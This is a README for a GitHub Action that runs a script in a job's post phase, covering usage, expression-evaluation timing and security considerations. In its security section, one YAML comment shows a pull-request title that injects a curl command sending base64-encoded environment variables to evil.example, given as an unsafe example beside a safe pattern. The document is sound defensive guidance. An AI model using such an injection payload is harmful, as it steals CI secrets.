[![StepSecurity Maintained Action](https://raw.githubusercontent.com/step-security/maintained-actions-assets/main/assets/maintained-action-banner.png)](https://docs.stepsecurity.io/actions/stepsecurity-maintained-actions)

# post-run-action

This action runs a script in the post process.
It is assumed that it will be called and used with a composite action that cannot perform post processing.

## Usage

See [action.yml](./action.yml)

```yaml
- name: Post Action
  uses: step-security/post-run-action@v3
  with:
    # custom shell
    # Default : bash -e {0}
    # bash    : bash --noprofile --norc -eo pipefail {0}
    # custom  : e.g. `bash -l -ex {0}`
    # see https://docs.github.com/ja/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsshell
    shell: bash -ex {0}
    # post run script text
    post-run: |
      echo "test" | tee "${{ runner.temp }}/test.txt"
      if [ -f "${{ runner.temp }}/post.sh" ]; then
        "${{ runner.temp }}/post.sh"
      fi
- name: Post Action (Python)
  id: test-python
  uses: step-security/post-run-action@v3
  with:
    shell: python
    post-run: |
      print("Hello, world!")


```

## Note on Expression Evaluation Timing

The `post-run` input is evaluated when the post step actually runs (during the post phase), not when the step is first processed.
This means that any expressions using `${{ ... }}` syntax (e.g., `${{ env.MY_VAR }}`) will capture the values at the time the post-run script executes,
reflecting any changes made during the workflow.

For example:

```yaml
env:
  MY_VAR: initial_value

steps:
  - uses: step-security/post-run-action@v3
    with:
      post-run: |
        # ${{ env.MY_VAR }} is evaluated at post-run time
        echo "Expression value: ${{ env.MY_VAR }}"  # Will output: modified_value
        echo "Environment value: $MY_VAR"            # Will output: modified_value

  - run: echo "MY_VAR=modified_value" >> "$GITHUB_ENV"
```

In this example, even though `MY_VAR` is modified in a step after the post-run-action step is defined,
the expression `${{ env.MY_VAR }}` will contain `modified_value` because it is evaluated when the post-run script actually executes (during the post phase).

## Security Considerations

The `post-run` input is executed as a shell script — by design, this action runs whatever you put in there. Same trust model as a regular `run:` step. A few things to watch out for:

### Do NOT pass unvalidated `github.event.*` data on `pull_request_target` workflows

`pull_request_target` runs in the context of the **base** repository with access
to its secrets, but the PR head can be controlled by an outside attacker. If you
put attacker-controlled values from `github.event.pull_request.*` (title, body,
branch name, head ref, commenter login, etc.) into `post-run`, the attacker can
inject shell commands and exfiltrate your secrets.

**Unsafe:**

```yaml
on: pull_request_target
jobs:
  bad:
    steps:
      - uses: step-security/post-run-action@v3
        with:
          # ❌ PR title is attacker-controlled. A title like
          #     '; curl evil.example/$(env | base64); #'
          # would exfiltrate every env var (including secrets).
          post-run: echo "PR title is ${{ github.event.pull_request.title }}"
```

**Safe:**

```yaml
on: pull_request_target
jobs:
  good:
    steps:
      - name: Capture PR title into env first (no interpolation into the script)
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "PR_TITLE captured"

      - uses: step-security/post-run-action@v3
        with:
          # ✅ $PR_TITLE is read at shell-runtime as a shell variable;
          # shell quoting protects against injection.
          post-run: |
            echo "PR title is $PR_TITLE"
```

The general rule: never let an attacker-controlled string flow into the `post-run` text via `${{ ... }}` interpolation. Pass it via an `env:` block and read it inside the script as a regular shell variable (`"$VAR"`), which the shell itself quotes safely.

When this action is invoked from a `pull_request_target`-triggered workflow, it emits a runtime warning to remind you of the above. The warning does **not** block execution — it's there to surface the risk at the moment that matters.

### Expression evaluation timing

See the "Note on Expression Evaluation Timing" section above. Because
expressions are evaluated when the post step runs (not at step definition time),
values can change between when you "captured" them in the workflow and when they
actually execute. If you depend on `${{ ... }}` expressions in `post-run` for
security-relevant logic (which you generally shouldn't — see the section above),
make sure no intermediate workflow step can mutate those values in an
attacker-controlled way.

### Temp file permissions

The generated post-run script is written to `$RUNNER_TEMP` with mode `0o600` (owner read/write only). This restricts other processes on the same runner from reading the script content (which may contain secrets you templated in via `env:` blocks). It does not protect against the running shell process itself, which inherits the script content.
